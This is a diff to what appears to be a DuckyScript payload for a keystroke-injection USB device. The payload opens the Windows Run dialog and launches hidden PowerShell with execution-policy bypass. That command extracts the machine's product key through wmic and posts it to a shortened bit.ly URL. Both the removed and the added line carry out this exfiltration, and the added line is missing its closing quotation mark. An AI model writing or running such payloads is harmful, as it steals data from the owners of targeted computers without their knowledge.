@@ -12,5 +12,5 @@ REM ###################################################
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass "$u='https://bit.ly/49SFZ7f';$k=(wmic path softwarelicensingservice get OA3xOriginalProductKey|Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value })-join '';$k=[string]::IsNullOrEmpty($k)?'No key':$k;irm -Uri $u -Method Post -Body @{content='PRODUCT KEY: '+$k} | ConvertTo-Json -Depth 1"
+STRING powershell -w h -ep bypass "$u='https://bit.ly/49SFZ7f';$k=(wmic path softwarelicensingservice get OA3xOriginalProductKey|Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value })-join '';irm -Uri $u -Method Post -Body @{content=$k} | ConvertTo-Json -Depth 1
 ENTER
